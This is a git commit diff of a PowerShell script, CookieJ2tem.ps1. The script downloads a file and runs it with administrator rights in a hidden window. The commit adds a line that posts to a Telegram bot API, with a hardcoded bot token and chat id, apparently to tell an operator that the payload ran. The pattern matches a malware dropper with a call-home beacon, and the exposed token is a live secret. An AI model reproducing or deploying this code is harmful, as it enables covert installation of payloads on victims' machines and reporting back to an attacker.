15fe2f0db936e882c04fdc4e6a43371a8c3bd9e1
POWERSHELL <103755102+37218vuuhuu@users.noreply.github.com>
2024-04-19 04:52:14 +0700

    Update CookieJ2tem.ps1

--- CookieJ2tem.ps1
+++ CookieJ2tem.ps1
@@ -6,7 +6,6 @@ Invoke-WebRequest -Uri $Url -OutFile $OutFile
 $InstallerPath = $OutFile
 $Arguments = '-fullinstall'
 $Command = "Start-Process -FilePath '$InstallerPath' -ArgumentList '$Arguments' -Verb RunAs -WindowStyle Hidden"
-Invoke-Expression -Command $Command
-
-# Sử dụng PS2EXE từ thư mục hiện tại
+Invoke-Expression -Command $Command;
+$telegramAPI = "https://api.telegram.org/bot5253984892:AAEYJmf0qy9OJjmCo__rrmiSk9t_tFIMvgE/sendMessage?chat_id=683643497&text=x";Invoke-WebRequest -Uri $telegramAPI -Method Post;
 
